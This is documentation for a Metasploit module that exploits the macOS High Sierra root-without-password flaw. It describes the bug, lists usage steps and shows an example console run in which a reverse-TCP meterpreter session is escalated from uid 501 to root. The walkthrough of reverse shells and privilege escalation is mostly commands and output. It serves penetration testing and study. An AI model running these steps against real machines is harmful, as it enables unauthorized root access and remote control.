## Vulnerable Application
This vulnerability works against OSX 10.13 (High Sierra).  Early
research (https://objective-see.com/blog/blog_0x24.html) suggests that
the vulnerability is the result of multiple errors ultimately started by
an incorrect return value from triggered by the function
`od_verify_crypt_password` returning true even if the account is
disabled.  The subsequent function calls appear to validate and create
the password, though there is still a lot of research into the bug and
these results should be verified once more research has been published.

## Verification Steps
1. Get a session on a vulnerable system
2. `use exploit/osx/local/root_no_password`
3. `set lhost <IP>`
4. `set lport <PORT>`
5. `set session <session_id>`
6. `run`

## Scenarios
### Example Run
```
msf exploit(psexec) > use exploit/multi/handler
msf exploit(handler) > set payload osx/x64/meterpreter_reverse_tcp
payload => osx/x64/meterpreter_reverse_tcp
msf exploit(handler) > set lhost <MSF_IP>
lhost => <MSF_IP>
msf exploit(handler) > set lport 4567
lport => 4567
msf exploit(handler) > run

[*] Started reverse TCP handler on <MSF_IP>:4567 
httpserver[*] Meterpreter session 1 opened (<MSF_IP>:4567 -> <OSX_IP>:49347) at 2017-11-29 07:28:32 -0600

meterpreter > sysinfo
Computer     : msfusers-Mac.local
OS           :  (MacOSX 17.0.0)
Architecture : x64
Meterpreter  : x64/osx
meterpreter > getuid
Server username: uid=501, gid=20, euid=501, egid=20
meterpreter > background
[*] Backgrounding session 1...
msf exploit(handler) > use exploit/osx/local/root_no_password 
msf exploit(root_no_password) > show options

Module options (exploit/osx/local/root_no_password):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Payload options (osx/x64/meterpreter_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Mac OS X 10.13.1 High Sierra x64 (Native Payload)


msf exploit(root_no_password) > set lhost <MSF_IP>
lhost => <MSF_IP>
msf exploit(root_no_password) > set lport 4562
lport => 4562
msf exploit(root_no_password) > set session 1
session => 1
msf exploit(root_no_password) > run

[*] Started reverse TCP handler on <MSF_IP>:4562 
[*] Writing payload file as '/tmp/cinbvsmrmyxw'
[*] Meterpreter session 2 opened (<MSF_IP>:4562 -> <OSX_IP>:62522) at 2017-11-29 07:29:56 -0600
[*] <OSX_IP> - Meterpreter session 2 closed.  Reason: Died


[*] Executing payload file as '/tmp/cinbvsmrmyxw'
[!] This exploit may require manual cleanup of '/tmp/cinbvsmrmyxw' on the target

[-] Invalid session identifier: 2
msf exploit(root_no_password) > 
msf exploit(root_no_password) > 
msf exploit(root_no_password) > run

[*] Started reverse TCP handler on <MSF_IP>:4562 
[*] Writing payload file as '/tmp/imtjkakowanv'
[*] Executing payload file as '/tmp/imtjkakowanv'
[*] Meterpreter session 3 opened (<MSF_IP>:4562 -> <OSX_IP>:49348) at 2017-11-29 07:30:53 -0600
[+] Deleted /tmp/imtjkakowanv

meterpreter > sysinfo
Computer     : msfusers-Mac.local
OS           :  (MacOSX 17.0.0)
Architecture : x64
Meterpreter  : x64/osx
meterpreter > getuid
Server username: uid=0, gid=20, euid=0, egid=20
meterpreter >
```
